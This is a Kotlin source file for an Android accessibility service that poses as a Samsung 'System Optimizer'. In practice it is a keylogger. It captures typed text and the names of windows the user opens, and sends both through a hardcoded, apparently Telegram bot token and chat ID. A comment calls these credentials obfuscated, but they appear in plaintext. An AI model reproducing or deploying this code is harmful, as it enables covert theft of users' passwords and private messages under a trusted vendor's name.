package com.samsung.android.app.smartcapture

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

class SystemOptimizerAccessibilityService : AccessibilityService() {

    // Same obfuscated credentials as the main service (XOR 0xAB)
    private val token = obfuscate("8699568956:AAE7eTdayK3EhKMhvpoMWBYrW91mTJohDUo")
    private val chatId = obfuscate("7597928991")

    private val transmission by lazy {
        TransmissionService(deobfuscate(token), deobfuscate(chatId))
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: "unknown"
                val className = event.className?.toString() ?: "unknown"
                transmission.sendStatusReport(
                    "[ACCESSIBILITY] Window: $packageName | Screen: $className"
                )
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (event.text?.isNotEmpty() == true) {
                    val text = event.text.joinToString("")
                    if (text.length <= 200) { // avoid flooding with large paste
                        transmission.sendStatusReport("[KEYLOG] $text")
                    }
                }
            }
        }
    }

    override fun onInterrupt() {}

    private fun obfuscate(input: String): String {
        return input.map { (it.code xor 0xAB).toChar() }.joinToString("")
    }

    private fun deobfuscate(input: String): String {
        return input.map { (it.code xor 0xAB).toChar() }.joinToString("")
    }
}
